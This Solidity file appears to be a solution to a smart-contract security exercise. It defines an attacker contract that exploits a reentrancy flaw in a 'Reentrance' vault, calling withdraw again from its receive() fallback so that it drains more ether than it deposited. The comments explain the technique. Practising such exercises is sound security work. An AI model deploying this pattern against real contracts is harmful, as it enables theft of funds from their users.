//SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "../src/Reentrancy.sol";

contract ReentrancySolution {
    // This attack utilizes the fact that the withdraw function is not protected against reentrancy.
    // The attack is performed by calling the withdraw function from the fallback function
    // of the attacker contract. Execution is handed over to the attacker contract during the
    // raw call to the msg.sender. Since the calldata is empty, the fallback function of the
    // attacker contract is called. This fallback function calls the withdraw function again,
    // which is still in the process of execution. This results in a recursive call to the
    // withdraw function, which allows the attacker to withdraw more funds than he is entitled to.

    Reentrance public reentrance;
    uint256 public withdrawIncrement;
    uint256 public reentrancyLoops;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function startAttack(uint256 _withdrawIncrement) public {
        // simply start the preprogrammed logic
        // contract has 0.001 eth before
        // donate 0.001 eth. The user has 0.001 eth
        // and the vault has 0.002 eth total
        // with a withdraw of 0.001 eth the attacker can do
        // one reentrancy loop.

        withdrawIncrement = _withdrawIncrement;
        reentrance.withdraw(withdrawIncrement);
    }

    function donateToVault() public payable {
        // donate some funds to the vault and increase
        // the balances the vault tracks for this contract
        reentrance.donate{value: msg.value}(address(this));
    }

    receive() external payable {
        

        if (address(reentrance).balance >= reentrance.balances(address(this)) && 
            reentrance.balances(address(this)) / withdrawIncrement != 0 ) {
            // there is more balance in the contract than this user has
            // one more round of reentrancy possible

            //console.log("vault balance", address(reentrance).balance);
            //console.log("attacker balance", reentrance.balances[address(this)]);

            reentrance.withdraw(withdrawIncrement);
            reentrancyLoops++;
        } 
    }
}